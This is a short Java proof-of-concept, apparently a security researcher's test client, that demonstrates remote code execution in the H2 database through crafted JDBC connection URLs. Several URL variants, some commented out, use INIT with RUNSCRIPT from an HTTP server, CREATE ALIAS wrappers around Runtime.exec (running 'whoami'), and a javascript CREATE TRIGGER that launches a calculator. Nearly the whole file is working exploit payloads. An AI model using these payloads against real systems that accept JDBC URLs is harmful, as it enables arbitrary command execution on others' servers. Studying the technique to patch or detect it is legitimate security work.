package com.example.h2rce;

import java.sql.Connection;
import java.sql.DriverManager;

public class h2JDBCClient {
    public static void main(String[] args) throws Exception {
        // H2 JDBC URL，关键点是 INIT=RUNSCRIPT FROM <http-url>
//        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/init.sql'";
//        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void cmd_exec(String cmd) throws java.lang.Exception {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('whoami')\\;";
//        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS 'String shellexec(String cmd) throws java.io.IOException {java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"A\")\\;return s.hasNext() ? s.next():\"\"\\;}'\\;CALL SHELLEXEC('open -a Calculator');";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('open -a Calculator')\n" +
                "$$\n";
        Connection conn = DriverManager.getConnection(url);
    }

}
